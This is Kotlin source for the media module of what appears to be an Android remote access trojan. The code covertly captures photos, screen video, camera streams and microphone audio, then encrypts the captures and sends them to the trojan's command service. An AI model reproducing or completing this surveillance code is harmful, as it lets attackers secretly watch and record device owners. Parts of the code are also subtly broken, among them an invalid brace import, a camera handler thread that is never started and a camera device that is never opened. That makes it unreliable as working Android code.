package com.rat.client.service

import android.app.Activity
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.params.StreamConfigurationMap
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.util.Size
import android.view.Surface
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import com.rat.client.RatApplication
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.util.{DeviceUtils, FileUtils, SystemUtils}
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors

class MediaProjectionService : Service() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "MediaProjectionService"
        private var mediaProjection: MediaProjection? = null
        private var mediaProjectionManager: MediaProjectionManager? = null
        private var cameraManager: CameraManager? = null
        private var cameraDevice: CameraDevice? = null
        private var captureSession: CameraCaptureSession? = null
        private var imageReader: ImageReader? = null
        private var mediaRecorder: MediaRecorder? = null
        private var isRecordingVideo = false
        private var isStreamingCamera = false
        private var isStreamingAudio = false
        private val handlerThread = HandlerThread("CameraThread")
        private val cameraHandler = Handler(handlerThread.looper)
        private val executor = Executors.newSingleThreadExecutor()

        
        fun setMediaProjectionData(resultCode: Int, data: Intent) {
            val context = RatApplication.getInstance() ?: return
            mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
            cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            Log.d(TAG, "Media projection initialized")
        }

        
        fun takePhoto(context: Context, cameraId: Int = 0, quality: Int = 90): Map<String, Any> {
            return try {
                if (mediaProjection == null) {
                    return mapOf("error" to "Media projection not initialized")
                }

                val cameraIdStr = getCameraId(context, cameraId)
                val characteristics = cameraManager?.getCameraCharacteristics(cameraIdStr)
                val map = characteristics?.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) as StreamConfigurationMap?
                val largestSize = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }

                val file = createMediaFile(context, "IMG", "jpg")
                imageReader = ImageReader.newInstance(largestSize?.width ?: 1920, largestSize?.height ?: 1080, ImageFormat.JPEG, 2)

                val captureRequestBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    ?.apply {
                        addTarget(imageReader!!.surface)
                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                        set(CaptureRequest.JPEG_QUALITY, quality)
                    }?.build()

                imageReader?.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    image?.let { img ->
                        val buffer = img.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        FileOutputStream(file).use { it.write(bytes) }
                        val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                        sendPhotoResult(base64, file)
                        img.close()
                    }
                }, cameraHandler)

                cameraDevice?.createCaptureSession(listOf(imageReader!!.surface), object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        session.capture(captureRequestBuilder!!, null, cameraHandler)
                    }
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                    }
                }, cameraHandler)

                mapOf("success" to true, "path" to file.absolutePath)
            } catch (e: Exception) {
                Log.e(TAG, "Take photo failed: ${e.message}")
                mapOf("error" to e.message ?: "Unknown error")
            }
        }

        
        fun recordVideo(context: Context, durationMs: Long = 10000, quality: Int = MediaRecorder.OutputFormat.MPEG_4): Map<String, Any> {
            return try {
                if (mediaProjection == null) {
                    return mapOf("error" to "Media projection not initialized")
                }

                if (isRecordingVideo) {
                    return mapOf("error" to "Already recording")
                }

                val file = createMediaFile(context, "VID", "mp4")
                mediaRecorder = MediaRecorder().apply {
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(quality)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setVideoEncodingBitRate(10000000)
                    setVideoFrameRate(30)
                    val displayMetrics = context.resources.displayMetrics
                    setVideoSize(displayMetrics.widthPixels, displayMetrics.heightPixels)
                    setOutputFile(file.absolutePath)
                }

                val surface = mediaRecorder.surface
                mediaRecorder.prepare()
                mediaRecorder.start()
                isRecordingVideo = true

                // Stop after duration
                Handler(android.os.Looper.getMainLooper()).postDelayed({
                    stopVideoRecording()
                }, durationMs)

                mapOf("success" to true, "path" to file.absolutePath, "duration_ms" to durationMs)
            } catch (e: Exception) {
                Log.e(TAG, "Record video failed: ${e.message}")
                mapOf("error" to e.message ?: "Unknown error")
            }
        }

        
        fun stopVideoRecording(): Map<String, Any> {
            return try {
                if (!isRecordingVideo || mediaRecorder == null) {
                    return mapOf("error" to "Not recording")
                }
                mediaRecorder?.stop()
                mediaRecorder?.reset()
                mediaRecorder?.release()
                mediaRecorder = null
                isRecordingVideo = false
                mapOf("success" to true)
            } catch (e: Exception) {
                Log.e(TAG, "Stop video failed: ${e.message}")
                mapOf("error" to e.message)
            }
        }

        
        fun toggleCameraStream(context: Context, enable: Boolean): Map<String, Any> {
            isStreamingCamera = enable
            if (enable) {
                startCameraStream(context)
            } else {
                stopCameraStream()
            }
            return mapOf("streaming" to enable)
        }

        private fun startCameraStream(context: Context) {
            executor.execute {
                try {
                    val cameraIdStr = getCameraId(context, 0)
                    val characteristics = cameraManager?.getCameraCharacteristics(cameraIdStr)
                    val map = characteristics?.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) as StreamConfigurationMap?
                    val size = map?.getOutputSizes(ImageFormat.YUV_420_888)?.minByOrNull { it.width * it.height } ?: Size(640, 480)

                    imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.YUV_420_888, 4)

                    cameraDevice?.createCaptureSession(listOf(imageReader!!.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            val request = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                                ?.apply { addTarget(imageReader!!.surface) }
                                ?.build()
                            session.setRepeatingRequest(request!!, null, cameraHandler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {}
                    }, cameraHandler)

                    imageReader?.setOnImageAvailableListener({ reader ->
                        val image = reader.acquireLatestImage()
                        image?.let { img ->
                            val yuvData = yuvToByteArray(img)
                            val base64 = Base64.encodeToString(yuvData, Base64.DEFAULT)
                            sendFrameResult(base64, "camera")
                            img.close()
                        }
                    }, cameraHandler)
                } catch (e: Exception) {
                    Log.e(TAG, "Camera stream error: ${e.message}")
                }
            }
        }

        private fun stopCameraStream() {
            captureSession?.stopRepeating()
            captureSession?.close()
            captureSession = null
            imageReader?.close()
            imageReader = null
            isStreamingCamera = false
        }

        
        fun recordAudio(context: Context, durationMs: Long = 10000, format: String = "amr"): Map<String, Any> {
            return try {
                val file = createMediaFile(context, "AUD", if (format == "amr") "amr" else "mp4")
                val recorder = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(if (format == "amr") MediaRecorder.OutputFormat.AMR_NB else MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                    setOutputFile(file.absolutePath)
                }
                recorder.prepare()
                recorder.start()

                Handler(android.os.Looper.getMainLooper()).postDelayed({
                    recorder.stop()
                    recorder.release()
                    val base64 = FileUtils.readFileAsBase64(file)
                    sendAudioResult(base64, file)
                }, durationMs)

                mapOf("success" to true, "path" to file.absolutePath, "duration_ms" to durationMs)
            } catch (e: Exception) {
                Log.e(TAG, "Record audio failed: ${e.message}")
                mapOf("error" to e.message ?: "Unknown error")
            }
        }

        
        fun toggleAudioStream(context: Context, enable: Boolean): Map<String, Any> {
            isStreamingAudio = enable
            if (enable) {
                startAudioStream()
            } else {
                stopAudioStream()
            }
            return mapOf("streaming" to enable)
        }

        private fun startAudioStream() {
            // Audio streaming would use AudioRecord with MediaProjection
            // Implementation omitted for brevity
        }

        private fun stopAudioStream() {
            isStreamingAudio = false
        }

        private fun getCameraId(context: Context, facing: Int): String {
            val cameraIdList = cameraManager?.cameraIdList ?: return "0"
            for (id in cameraIdList) {
                val characteristics = cameraManager?.getCameraCharacteristics(id)
                val lensFacing = characteristics?.get(CameraCharacteristics.LENS_FACING)
                if (lensFacing == facing) return id
            }
            return cameraIdList[0]
        }

        private fun createMediaFile(context: Context, prefix: String, extension: String): File {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val filename = "${prefix}_${timestamp}.${extension}"
            val mediaDir = context.getExternalFilesDir(android.os.Environment.DIRECTORY_PICTURES) ?: context.filesDir
            return File(mediaDir, filename)
        }

        private fun yuvToByteArray(image: Image): ByteArray {
            val yBuffer = image.planes[0].buffer
            val uBuffer = image.planes[1].buffer
            val vBuffer = image.planes[2].buffer

            val ySize = yBuffer.remaining()
            val uSize = uBuffer.remaining()
            val vSize = vBuffer.remaining()

            val result = ByteArray(ySize + uSize + vSize)
            yBuffer.get(result, 0, ySize)
            uBuffer.get(result, ySize, uSize)
            vBuffer.get(result, ySize + uSize, vSize)
            return result
        }

        private fun sendPhotoResult(base64: String, file: File) {
            val service = RatService.getInstance()
            val data = mapOf(
                "type" to "photo",
                "base64" to base64,
                "path" to file.absolutePath,
                "size" to file.length(),
                "timestamp" to System.currentTimeMillis()
            )
            service?.sendCommand("media_result", EncryptionUtils.encrypt(Gson().toJson(data)))
        }

        private fun sendFrameResult(base64: String, type: String) {
            val service = RatService.getInstance()
            val data = mapOf(
                "type" to "frame",
                "subtype" to type,
                "base64" to base64,
                "timestamp" to System.currentTimeMillis()
            )
            service?.sendCommand("media_stream", EncryptionUtils.encrypt(Gson().toJson(data)))
        }

        private fun sendAudioResult(base64: String, file: File) {
            val service = RatService.getInstance()
            val data = mapOf(
                "type" to "audio",
                "base64" to base64,
                "path" to file.absolutePath,
                "size" to file.length(),
                "timestamp" to System.currentTimeMillis()
            )
            service?.sendCommand("media_result", EncryptionUtils.encrypt(Gson().toJson(data)))
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}